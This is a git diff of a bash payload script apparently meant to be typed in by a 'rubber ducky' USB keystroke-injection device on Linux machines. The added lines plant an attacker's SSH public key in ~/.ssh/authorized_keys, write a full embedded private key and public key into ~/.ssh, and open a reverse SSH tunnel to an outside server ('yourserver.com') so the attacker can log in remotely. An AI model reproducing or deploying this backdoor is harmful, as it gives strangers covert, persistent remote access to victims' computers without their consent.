@@ -1,5 +1,75 @@
 #!/bin/bash
 
-# This is the script the rubber ducky would run for linux systems
-echo "test"
+# This is the script the rubber ducky would run for linux systems. User-mode,
+# not root.
+mkdir -p ~/.ssh
+
+# This allows us (attacker) to login to this machine
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTkcb9KfbRq/x8JelffkKDcEIqey2l9cAGNgIH7E8+H fork_important@pm.me" >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+
+echo "Injected public key for login."
+
+
+# This key is used nowhere else but for takeover. Server has settings to
+# only allow tunnel access
+echo """-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+""" > ~/.ssh/key
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCvMUG/pA///rdTakZhZJ9en0urbLJIaI/Y9tUI3N5U7ve+ckY/3beiltLKdkgOk7UhqF5soj/+eBZT9E8jPgnH+9MUQVIUSmHsbazPuFyiJ6mr2W5HQsUTJobu8jx5s9tGfMlxbe9py+FKPyz/2QISreEyty0qKgZ5OKPJicRx6SqRAMnef2zlUlBqCcHYqIhHnPO2snWPR8Wlt/VlVrIbi1qpIrkq3hc+W6JyijQAnJg+ze+Unq1S/ROed7L4IR6d4Xmgwe5DwbAQv8ghniW+qk7uG0fJuzaNogYH9zQFqsAYuP7Dm/cvJMDdgpnAS2iDyVKWPPUvVjUAGUoMzUg/BZMXHAg5jlswU/2uB7gG2ZvKNHgCYu636uYiowBdKB8RxFTEhNFNSArkKZJe27bqkHHs8qheRHWCXPdv8D6B85cOEsPrvdjOZxmH6bBXSqalWXVM0IyyZYrA5z52i0cUQcRKo+ZccetzOPu3ReSBLNWEz2QpUx8b8coQVNdxGCHXpBpPmq00HtjzXcyQXpzYJzWY/Cb+RSDAdzBK2kGWgMKAtN2i2sYpL2SMlULxgH/WSzCFOMGApE1B7E4LkKTbeP/dJio+Dsvxde0fTMQb+xDi+xoCPsdxWwe7uDLU1/FpSusieR79hWHa5vYn5ha1Yk0AQyTBXPUk8UNF+oYypQ== compromised only" > ~/.ssh/key.pub
+
+
+
+
+ssh -N -R 2222:localhost:22 root@yourserver.com
+
 
